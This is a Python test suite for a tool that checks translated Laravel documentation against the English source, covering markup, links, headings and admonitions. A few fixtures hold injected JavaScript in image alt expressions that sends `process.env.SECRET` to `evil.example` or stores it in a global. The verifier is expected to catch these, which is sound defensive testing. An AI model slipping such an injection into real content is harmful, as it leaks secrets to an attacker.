    def test_detects_code_block_content_changed(self):
        """code 블록 내용 changed 감지 검증."""

        source = """```js
// Create a user
const user = {};
```
"""
        translated = """```js
// 사용자를 생성합니다
const user = {};
```
"""

        self.assertIn("code block mismatch", verify.verify(translated, source=source))

    def test_detects_fence_that_consumes_the_document_tail(self):
        """fence that consumes 문서 tail 감지 검증."""

        source = "Keep this text.\n"
        translated = (
            "<!-- Keep this text. -->\n"
            "번역문입니다.\n"
            "```\n"
            "malformed <div> and {{version}}\n"
        )

        self.assertIn(
            "code block mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_fenced_code_blocks_with_equivalent_trailing_newline(self):
        """fenced code 블록 포함 equivalent trailing newline 허용 검증."""

        source = """```php
echo 'ok';
```
"""
        translated = """```php
echo 'ok';
```"""

        self.assertNotIn("code block mismatch", verify.verify(translated, source=source))

    def test_rejects_fenced_code_blocks_with_changed_trailing_spaces(self):
        """fenced code 블록 포함 changed trailing spaces 거부 검증."""

        source = "```php\nreturn true;    \n```\n"
        translated = "```php\nreturn true;\n```\n"

        self.assertIn("code block mismatch", verify.verify(translated, source=source))

    def test_accepts_long_fenced_code_blocks_with_inner_shorter_fence(self):
        """long fenced code 블록 포함 inner shorter fence 허용 검증."""

        source = "````markdown\n```php\necho 'ok';\n```\n````\n"
        translated = source

        self.assertNotIn("code block mismatch", verify.verify(translated, source=source))

    def test_detects_quoted_fenced_code_content_changed(self):
        """quoted fenced code 내용 changed 감지 검증."""

        source = "> ```text\n> literal\n> ```\n"
        translated = "> ```text\n> translated\n> ```\n"

        self.assertIn("code block mismatch", verify.verify(translated, source=source))

    def test_does_not_close_fence_at_different_blockquote_depth(self):
        """않음 close fence at different blockquote depth 동작 검증."""

        source = "```text\n> ```\nliteral\n```\n"
        translated = "```text\n> ```\ntranslated\n```\n"

        self.assertIn("code block mismatch", verify.verify(translated, source=source))

    def test_detects_html_anchor_name_changed(self):
        """HTML anchor name changed 감지 검증."""

        source = '<a name="basic-routing"></a>\n\n# Routing\n'
        translated = """<!-- <a name="basic-routing"></a> -->
<a name="기본-라우팅"></a>

<!-- # Routing -->
# 라우팅 (Routing)
"""

        self.assertIn("anchor mismatch", verify.verify(translated, source=source))

    def test_does_not_treat_data_name_as_anchor_name(self):
        """않음 treat data name 로 anchor name 동작 검증."""

        source = '<a name="basic-routing"></a>\n'
        translated = '<a data-name="basic-routing"></a>\n'

        self.assertIn("anchor mismatch", verify.verify(translated, source=source))

    def test_detects_html_image_source_changed(self):
        """HTML image 원문 changed 감지 검증."""

        source = '<img src="/img/original.png" alt="Original"/>\n'
        translated = '<img src="/img/changed.png" alt="번역"/>\n'

        self.assertIn(
            "html image source mismatch",
            verify.verify(translated, source=source),
        )

    def test_does_not_treat_data_src_as_image_src(self):
        """않음 treat data src 로 image src 동작 검증."""

        source = '<img src="/img/original.png"/>\n'
        translated = '<img data-src="/img/original.png"/>\n'

        self.assertIn(
            "html image source mismatch",
            verify.verify(translated, source=source),
        )

    def test_ignores_translation_alias_anchors(self):
        """`ignores_translation_alias_anchors` 시나리오 검증."""

        source = '<a name="generating-migrations"></a>\n\n# Migrations\n'
        translated = """<!-- <a name="generating-migrations"></a> -->
<a name="generating-migrations"></a>
<a name="writing-migrations" data-translation-alias="true"></a>

<!-- # Migrations -->
# 마이그레이션 (Migrations)
"""

        self.assertNotIn("anchor mismatch", verify.verify(translated, source=source))

    def test_detects_missing_original_english_comment_for_heading_or_paragraph(self):
        """누락된 original english comment 대상 heading 또는 paragraph 감지 검증."""

        source = "# Installation\n\nInstall Laravel with Composer.\n"
        translated = "# 설치 (Installation)\n\nComposer로 Laravel을 설치합니다.\n"

        self.assertIn("missing original comment", verify.verify(translated, source=source))
        self.assertEqual(
            verify.missing_original_comments(translated, source),
            ["# Installation", "Install Laravel with Composer."],
        )

    def test_accepts_escaped_js_comment_closer_inside_original_comment(self):
        """escaped js comment closer inside original comment 허용 검증."""

        source = "Use `DB::raw(/* ... */)` carefully."
        translated = """<!-- Use `DB::raw(/* ... *&#47;)` carefully. -->
`DB::raw(/* ... */)`를 신중하게 사용합니다.
"""

        self.assertNotIn("missing original comment", verify.verify(translated, source=source))

    def test_does_not_require_comments_for_standalone_html_tags(self):
        """않음 require comments 대상 standalone HTML tags 동작 검증."""

        source = '<div class="grid">\n\nBody.\n\n</div>\n'
        translated = (
            '<div class="grid">\n\n'
            "<!-- Body. -->\n본문입니다.\n\n"
            "</div>\n"
        )

        self.assertNotIn(
            "missing original comment",
            verify.verify(translated, source=source),
        )

    def test_detects_missing_standalone_html_wrappers(self):
        """누락된 standalone HTML wrappers 감지 검증."""

        source = '<div class="content-list" markdown="1">\n\nBody.\n\n</div>\n'
        translated = "<!-- Body. -->\n본문입니다.\n"

        issues = verify.verify(translated, source=source)

        self.assertIn("html tag mismatch", issues)
        self.assertNotIn("missing original comment", issues)

    def test_accepts_blankless_html_wrappers_with_body_comment(self):
        """blankless HTML wrappers 포함 body comment 허용 검증."""

        source = '<div class="content-list">\nBody.\n</div>\n'
        translated = (
            '<div class="content-list">\n'
            "<!-- Body. -->\n본문입니다.\n"
            "</div>\n"
        )

        issues = verify.verify(translated, source=source)

        self.assertNotIn("html tag mismatch", issues)
        self.assertNotIn("missing original comment", issues)

    def test_detects_missing_multi_tag_structural_fragment(self):
        """누락된 multi tag structural fragment 감지 검증."""

        source = '<p><img src="/img/example.png"/></p>\n'

        self.assertIn("html tag mismatch", verify.verify("", source=source))

    def test_detects_missing_inline_table_tags(self):
        """누락된 inline table tags 감지 검증."""

        source = "<tr><td>Command</td></tr>\n"
        translated = "<!-- <tr><td>Command</td></tr> -->\n명령\n"

        self.assertIn("html tag mismatch", verify.verify(translated, source=source))

    def test_checks_inline_tags_beside_named_anchor(self):
        """`checks_inline_tags_beside_named_anchor` 시나리오 검증."""

        source = '<a name="example"></a><img src="/img/example.png"/>\n'
        translated = '<a name="example"></a>\n'

        self.assertIn("html tag mismatch", verify.verify(translated, source=source))

    def test_normalizes_known_stale_link_targets_before_comparing(self):
        """comparing 전 known stale 링크 대상 정규화 검증."""

        source = "See [Agents](#agents-integration)."
        translated = """<!-- See [Agents](#agents-integration). -->
[Agents](#agent-integration)를 참고하세요.
"""

        self.assertNotIn("link target mismatch", verify.verify(translated, source=source))

    def test_normalizes_controller_stale_target_only_after_v9(self):
        """v9 후 controller stale 대상 only 정규화 검증."""

        target = "#actions-handled-by-resource-controller"

        self.assertEqual(
            verify._normalize_link_target(target, version="9.x"),
            target,
        )
        self.assertEqual(
            verify._normalize_link_target(target, version="10.x"),
            "#actions-handled-by-resource-controllers",
        )

    def test_normalizes_agents_target_only_in_v12_and_master(self):
        """agents 대상 만 in v12 및 master 정규화 검증."""

        target = "#agents-integration"

        self.assertEqual(
            verify._normalize_link_target(target, version="12.x"),
            "#agent-integration",
        )
        self.assertEqual(
            verify._normalize_link_target(target, version="13.x"),
            target,
        )

    def test_normalizes_versioned_absolute_doc_links_to_relative_targets(self):
        """versioned absolute doc 링크 후 상대 대상 정규화 검증."""

        source = "See [Cache](cache)."
        translated = """<!-- See [Cache](cache). -->
[Cache](/docs/12.x/cache)를 참고하세요.
"""

        issues = verify.verify(translated, source=source, version="12.x")

        self.assertNotIn("link target mismatch", issues)
        self.assertNotIn("link pair mismatch", issues)

    def test_preserves_distinct_link_target_route_classes(self):
        """distinct 링크 대상 route classes 보존 검증."""

        cases = (
            ("/docs/13.x/cache", "/cache"),
            ("/docs/13.x/#intro", "#intro"),
            ("/docs/13.x/?view=all", "?view=all"),
            ("/docs/13.x//cache", "cache"),
            ("./https://example.com", "https://example.com"),
            ("./mailto:user@example.com", "mailto:user@example.com"),
        )

        for source_target, translated_target in cases:
            with self.subTest(
                source_target=source_target,
                translated_target=translated_target,
            ):
                source = f"See [Target]({source_target}).\n"
                translated = (
                    f"<!-- See [Target]({source_target}). -->\n"
                    f"[Target]({translated_target})를 참고하세요.\n"
                )

                issues = verify.verify(
                    translated,
                    source=source,
                    version="13.x",
                )

                self.assertIn("link target mismatch", issues)
                self.assertIn("link pair mismatch", issues)

    def test_normalizes_only_valid_current_version_document_paths(self):
        """만 valid current 버전 문서 경로 정규화 검증."""

        cases = (
            ("cache?view=all#intro", "/docs/13.x/cache?view=all#intro"),
            (
                "cache?view=all#intro",
                "https://laravel.com/docs/13.x/cache?view=all#intro",
            ),
            ("cache", "./cache"),
        )

        for source_target, translated_target in cases:
            with self.subTest(translated_target=translated_target):
                source = f"See [Target]({source_target}).\n"
                translated = (
                    f"<!-- See [Target]({source_target}). -->\n"
                    f"[Target]({translated_target})를 참고하세요.\n"
                )

                issues = verify.verify(
                    translated,
                    source=source,
                    version="13.x",
                )

                self.assertNotIn("link target mismatch", issues)
                self.assertNotIn("link pair mismatch", issues)

    def test_detects_internal_doc_link_version_drift(self):
        """internal doc 링크 버전 drift 감지 검증."""

        source = "See [Cache](/docs/13.x/cache)."
        translated = """<!-- See [Cache](/docs/13.x/cache). -->
[Cache](/docs/12.x/cache)를 참고하세요.
"""

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link target mismatch", issues)
        self.assertIn("link pair mismatch", issues)

    def test_detects_laravel_absolute_doc_link_version_drift(self):
        """laravel absolute doc 링크 버전 drift 감지 검증."""

        source = "See [Cache](https://laravel.com/docs/13.x/cache)."
        translated = """<!-- See [Cache](https://laravel.com/docs/13.x/cache). -->
[Cache](https://laravel.com/docs/12.x/cache)를 참고하세요.
"""

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link target mismatch", issues)
        self.assertIn("link pair mismatch", issues)

    def test_normalizes_laravel_absolute_doc_links_to_relative_targets(self):
        """laravel absolute doc 링크 후 상대 대상 정규화 검증."""

        source = "See [Cache](cache)."
        for version in ("12.x", "master"):
            with self.subTest(version=version):
                translated = (
                    "<!-- See [Cache](cache). -->\n"
                    f"[Cache](https://laravel.com/docs/{version}/cache)를 참고하세요.\n"
                )

                issues = verify.verify(translated, source=source, version=version)

                self.assertNotIn("link target mismatch", issues)
                self.assertNotIn("link pair mismatch", issues)

    def test_keeps_nonversioned_laravel_doc_urls_external(self):
        """nonversioned laravel doc urls 외부 유지 검증."""

        source = "See [Sanctum](sanctum)."
        translated = """<!-- See [Sanctum](sanctum). -->
[Sanctum](https://laravel.com/docs/sanctum)를 참고하세요.
"""

        self.assertIn("link target mismatch", verify.verify(translated, source=source))

    def test_ignores_the_removed_v8_assert_similar_json_link(self):
        """본문 섹션이 제거된 8.x assertSimilarJson 링크 비교 제외."""

        source = "See [assertSimilarJson](#assert-similar-json)."
        translated = f"<!-- {source} -->\n`assertSimilarJson`를 참고하세요.\n"

        issues = verify.verify(translated, source=source, version="8.x")

        self.assertNotIn("link target mismatch", issues)
        self.assertNotIn("link label mismatch", issues)
        self.assertNotIn("link pair mismatch", issues)

    def test_normalizes_the_v9_shortcode_link_to_unicode_content(self):
        """9.x shortcode 목차 오타를 Unicode Content 대상으로 비교."""

        source = "See [Formatting](#formatting-shortcode-notifications)."
        translated = (
            f"<!-- {source} -->\n"
            "[Formatting](#unicode-content)를 참고하세요.\n"
        )

        issues = verify.verify(translated, source=source, version="9.x")

        self.assertNotIn("link target mismatch", issues)
        self.assertNotIn("link pair mismatch", issues)

    def test_does_not_ignore_unknown_missing_anchor_links(self):
        """않음 ignore unknown 누락된 anchor 링크 동작 검증."""

        source = "See [Unknown section](#unknown-section)."
        translated = f"<!-- {source} -->\n알 수 없는 섹션을 참고하세요.\n"

        issues = verify.verify(translated, source=source)

        self.assertIn("link target mismatch", issues)
        self.assertIn("link label mismatch", issues)
        self.assertIn("link pair mismatch", issues)

    def test_detects_heading_level_mismatch(self):
        """heading level mismatch 감지 검증."""

        source = "# Title\n\n## Install\n"
        translated = """<!-- # Title -->
# 제목 (Title)

<!-- ## Install -->
### 설치 (Install)
"""

        self.assertIn("heading mismatch", verify.verify(translated, source=source))

    def test_detects_translated_heading_text(self):
        """translated heading text 감지 검증."""

        source = "# Title\n\n## Install\n"
        translated = """<!-- # Title -->
# Title

<!-- ## Install -->
## 설치 (Install)
"""

        self.assertIn("heading text mismatch", verify.verify(translated, source=source))

    def test_detects_removed_explicit_heading_id(self):
        """removed explicit heading id 감지 검증."""

        source = "# Stable {#stable-anchor}\n"
        translated = """<!-- # Stable {#stable-anchor} -->
# Stable
"""

        self.assertIn("heading text mismatch", verify.verify(translated, source=source))

    def test_detects_translated_front_matter_title(self):
        """translated front matter title 감지 검증."""

        source = "---\ntitle: Installation\n---\n\n# Installation\n"
        translated = "---\ntitle: 설치\n---\n\n<!-- # Installation -->\n# Installation\n"

        self.assertIn(
            "front matter title mismatch", verify.verify(translated, source=source)
        )

    def test_does_not_treat_later_horizontal_rule_as_front_matter(self):
        """않음 treat later horizontal rule 로 front matter 동작 검증."""

        source = "Intro.\n\n---\n\nDetails.\n"
        translated = """<!-- Intro. -->
소개입니다.

---

상세입니다.
"""

        self.assertIn("missing original comment", verify.verify(translated, source=source))

    def test_detects_admonition_body_outside_blockquote(self):
        """admonition body 외부 blockquote 감지 검증."""

        translated = """> [!NOTE]
<!-- Note body. -->
본문입니다.
"""

        self.assertIn("admonition body outside blockquote", verify.verify(translated))

    def test_detects_duplicated_admonition_marker(self):
        """duplicated admonition marker 감지 검증."""

        translated = """> [!NOTE]
> [!NOTE]
> <!-- Vector search requires the [AI SDK](/docs/13.x/ai-sdk). -->
> 벡터 검색에는 [AI SDK](/docs/13.x/ai-sdk)가 필요합니다.
"""

        self.assertIn("duplicate admonition marker", verify.verify(translated))

    def test_accepts_single_admonition_marker(self):
        """single admonition marker 허용 검증."""

        translated = """> [!NOTE]
> <!-- Vector search requires the [AI SDK](/docs/13.x/ai-sdk). -->
> 벡터 검색에는 [AI SDK](/docs/13.x/ai-sdk)가 필요합니다.
"""

        self.assertNotIn("duplicate admonition marker", verify.verify(translated))

    def test_rejects_changed_final_admonition_type(self):
        """changed final admonition type 거부 검증."""

        source = "> [!CAUTION]\n> Protect credentials.\n"
        translated = "> [!NOTE]\n> 認証情報を保護します。\n"

        self.assertIn(
            "admonition type mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_same_final_admonition_type_from_inline_source_marker(self):
        """same final admonition type from inline 원문 marker 허용 검증."""

        source = "> [!NOTE] Protect credentials.\n"
        translated = "> [!NOTE]\n> 認証情報を保護します。\n"

        self.assertNotIn(
            "admonition type mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_final_admonition_type_in_markdown_containers(self):
        """changed final admonition type in Markdown containers 거부 검증."""

        cases = (
            (
                "- > [!WARNING] Protect credentials.\n",
                "- > [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                "1. > [!WARNING] Protect credentials.\n",
                "1. > [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                ">> [!WARNING] Protect credentials.\n",
                ">> [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                "> [!WARNING]Protect credentials.\n",
                "> [!NOTE]자격 증명을 보호합니다.\n",
            ),
            (
                "> [!WARNING]\n> Protect credentials.\n",
                "> [!warning]\n> 자격 증명을 보호합니다.\n",
            ),
        )

        for source, translated in cases:
            with self.subTest(source=source):
                self.assertIn(
                    "admonition type mismatch",
                    verify.verify(translated, source=source),
                )

    def test_ignores_single_comment_opener_inside_inline_code(self):
        """`ignores_single_comment_opener_inside_inline_code` 시나리오 검증."""

        source = "Use `<!--` literally.\n"
        translated = (
            "<!-- Use `<!--` literally. -->\n"
            "`<!--`를 그대로 사용합니다.\n"
        )

        self.assertNotIn(
            "malformed HTML comment",
            verify.verify(translated, source=source),
        )

    def test_detects_legacy_note_colon_inside_bold_text(self):
        """legacy note colon inside bold text 감지 검증."""

        self.assertIn(
            "legacy note marker",
            verify.verify("> **Note:** Keep this.\n"),
        )
        for marker in (
            "> **참고:** 본문입니다.\n",
            "> **注意:** 本文です。\n",
            "> **注:** 本文です。\n",
        ):
            with self.subTest(marker=marker):
                self.assertIn("legacy note marker", verify.verify(marker))

    def test_detects_every_plain_legacy_admonition_marker(self):
        """every plain legacy admonition marker 감지 검증."""

        for marker in (
            "Note",
            "Tip",
            "Warning",
            "Caution",
            "Important",
            "참고",
            "注意",
            "注",
        ):
            with self.subTest(marker=marker):
                self.assertIn(
                    "legacy note marker",
                    verify.verify(f"> {marker}\n> Body.\n"),
                )

    def test_ignores_img_and_legacy_alert_syntax_inside_html_comments(self):
        """`ignores_img_and` 관련 경계 조건 검증."""

        text = (
            "<!--\n"
            "> **Note:** Keep this literal.\n"
            "> [!WARNING]\n"
            '<img src="example.png">\n'
            "-->\n"
        )

        issues = verify.verify(text, source=text, allow_source_echo=True)

        self.assertNotIn("legacy note marker", issues)
        self.assertNotIn("unclosed img tag", issues)
        self.assertNotIn("admonition body outside blockquote", issues)
        self.assertNotIn("duplicate admonition marker", issues)

    def test_handles_greater_than_in_img_attribute_when_checking_self_close(self):
        """checking self close 시 greater than in img attribute 처리 검증."""

        self.assertNotIn(
            "unclosed img tag",
            verify.verify('<img src="example.png" alt="1 > 0"/>\n'),
        )
        self.assertIn(
            "unclosed img tag",
            verify.verify('<img src="example.png" alt="1 > 0">\n'),
        )

    def test_handles_greater_than_in_img_jsx_expression(self):
        """greater than in img jsx expression 처리 검증."""

        self.assertNotIn(
            "unclosed img tag",
            verify.verify("<img hidden={count > 0} />\n"),
        )
        self.assertIn(
            "unclosed img tag",
            verify.verify("<img hidden={count > 0}>\n"),
        )

    def test_rejects_changed_html_image_display_expression(self):
        """changed HTML image display expression 거부 검증."""

        source = (
            '<img src="/a.png" '
            'alt={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={"キャッシュ " + process.env.SECRET + " 状態"} />\n'
        )

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_translated_html_image_display_text_with_same_expression(self):
        """translated HTML image display text 포함 same expression 허용 검증."""

        source = (
            '<img src="/a.png" '
            'alt={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={"キャッシュ " + labels.safe + " 状態"} />\n'
        )

        self.assertNotIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_translated_non_image_display_attribute(self):
        """translated non image display attribute 허용 검증."""

        source = '<Widget aria-label={"Cache lock"} />\n'
        translated = (
            '<!-- <Widget aria-label={"Cache lock"} /> -->\n'
            '<Widget aria-label={"캐시 잠금"} />\n'
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_changed_non_image_display_expression(self):
        """changed non image display expression 거부 검증."""

        source = (
            '<Widget aria-label={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<!-- <Widget aria-label={"Cache " + labels.safe + " status"} /> -->\n'
            '<Widget aria-label={"캐시 " + process.env.SECRET + " 상태"} />\n'
        )

        self.assertIn(
            "html display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_string_argument_in_image_display_expression(self):
        """changed string argument in image display expression 거부 검증."""

        source = (
            '<img src="/a.png" '
            'alt={getLabel("safe") + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={getLabel("secret") + " 状態"} />\n'
        )

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_image_expression_containing_regex_literal(self):
        """changed image expression containing regex literal 거부 검증."""

        source = (
            '<img src="/a.png" '
            'alt={/[\\\'>]/.test(label) ? "safe" : "other"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={/[\\\'>]/.test((fetch("https://evil.example/" '
            '+ process.env.SECRET), label)) ? "safe" : "other"} />\n'
        )

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_image_expression_hidden_between_js_comments(self):
        """image expression hidden between js comments 거부 검증."""

        source = (
            '<img src="/a.png" alt={label /* + " */ '
            '+ (void 0) + /* " + */ + " visible"} />\n'
        )
        translated = (
            '<img src="/a.png" alt={label /* + " */ '
            '+ (globalThis.pwned = process.env.SECRET) '
            '+ /* " + */ + " 表示"} />\n'
        )

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_quote_text_inside_image_regex_literal(self):
        """changed quote text inside image regex literal 거부 검증."""

        source = '<img src="/a.png" alt={/a+\'SAFE\'+b/.source} />\n'
        translated = '<img src="/a.png" alt={/a+\'EVIL\'+b/.source} />\n'

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_list_markers_dropped_in_translation(self):
        """list markers dropped in 번역 감지 검증."""

        source = """- [Using Eloquent](https://example.com/eloquent/) stores models.
- [Write queries](https://example.com/queries/) with the builder.
"""
        translated = """<!--
- [Using Eloquent](https://example.com/eloquent/) stores models.
- [Write queries](https://example.com/queries/) with the builder.
-->
[Using Eloquent](https://example.com/eloquent/) を使うとモデルを保存できます。

[Write queries](https://example.com/queries/) をビルダーで作成できます。
"""

        self.assertIn("list marker mismatch", verify.verify(translated, source=source))

    def test_accepts_preserved_list_markers(self):
        """preserved list markers 허용 검증."""

        source = """- [Using Eloquent](https://example.com/eloquent/) stores models.
- [Write queries](https://example.com/queries/) with the builder.
"""
        translated = """<!--
- [Using Eloquent](https://example.com/eloquent/) stores models.
- [Write queries](https://example.com/queries/) with the builder.
-->
- [Using Eloquent](https://example.com/eloquent/) を使うとモデルを保存できます。
- [Write queries](https://example.com/queries/) をビルダーで作成できます。
"""

        self.assertNotIn("list marker mismatch", verify.verify(translated, source=source))

    def test_rejects_translation_that_expands_prose_into_a_list(self):
        """번역 that expands prose into list 거부 검증."""

        source = "Supported serializers include: `A`, `B`, and `C`.\n"
        translated = """<!-- Supported serializers include: `A`, `B`, and `C`. -->
지원되는 직렬화 방식:

- `A`
- `B`
- `C`
"""

        self.assertIn("list marker mismatch", verify.verify(translated, source=source))

    def test_distinguishes_source_comment_from_annotation(self):
        """원문 작성 주석과 번역 annotation 역할 구분."""

        source = """<!-- Same. -->

Same.
"""
        translated = """<!-- Same. -->
동일합니다.
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_relocated_source_comment(self):
        """구조 위치가 바뀐 원문 작성 주석 거부."""

        source = """<!-- keep -->

First paragraph.

Second paragraph.
"""
        translated = """<!-- First paragraph. -->
첫 번째 문단입니다.

<!-- keep -->

<!-- Second paragraph. -->
두 번째 문단입니다.
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_stale_legacy_note_comment(self):
        """최종 문서에 남아 있는 기존 note 주석 거부."""

        source = """> [!NOTE]
> Current guidance.
"""
        translated = """<!-- > **Note:** Current guidance. -->
> [!NOTE]
> 現在の案内です。
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_invalid_front_matter_description(self):
        """문자열이 아닌 머리말 description 거부."""

        source = """---
slug: cache
description: Cache guide.
---

Acquire the cache lock.
"""
        translated = """---
slug: cache
description: {ko: 캐시 안내}
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "front matter description invalid",
            verify.verify(translated, source=source),
        )
